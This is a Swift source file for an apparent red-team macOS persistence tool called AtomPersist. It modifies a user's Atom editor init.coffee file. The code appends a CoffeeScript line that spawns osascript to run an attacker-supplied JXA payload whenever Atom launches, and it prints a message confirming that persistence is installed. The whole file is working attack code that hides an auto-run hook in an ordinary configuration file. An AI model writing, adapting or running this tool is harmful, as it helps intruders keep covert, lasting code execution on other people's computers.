import Foundation
import OSAKit
import Cocoa

//Usage: ./AtomPersist [path_to_js_jxa_payload]

var output = ""
let fm = FileManager.default
var uname = NSUserName()
var atomPath = "/System/Volumes/Data/Users/\(uname)/.atom/init.coffee"

var isDir = ObjCBool(true)
var atomExistsCheck = fm.fileExists(atPath: atomPath)
let scriptName = CommandLine.arguments[0]

if CommandLine.arguments.count != 2{
    print("Usage: \(scriptName) [path_to_js_jxa_payload]")
    print("Exiting...")
    exit(0)
}
else{
    let script = CommandLine.arguments[1]
    do {
        if fm.fileExists(atPath: atomPath,isDirectory: &isDir){
            let atomContents = try String(contentsOfFile: atomPath)
            let contents2 = atomContents + "\n" + "{spawn} = require 'child_process'\natom = spawn 'osascript', ['\(script)','&']"
            let atomURL = URL(fileURLWithPath: atomPath)
            try contents2.write(to: atomURL, atomically: true, encoding: String.Encoding.utf8)
            print("[+] Atom init file has been modified to run your jxa payload for persistence!")
        }
        else {
            output += "[-] Atom is not installed on the target"
            print(output)
        }
        
    }
    catch let error{
        print(error)
    }
    
}
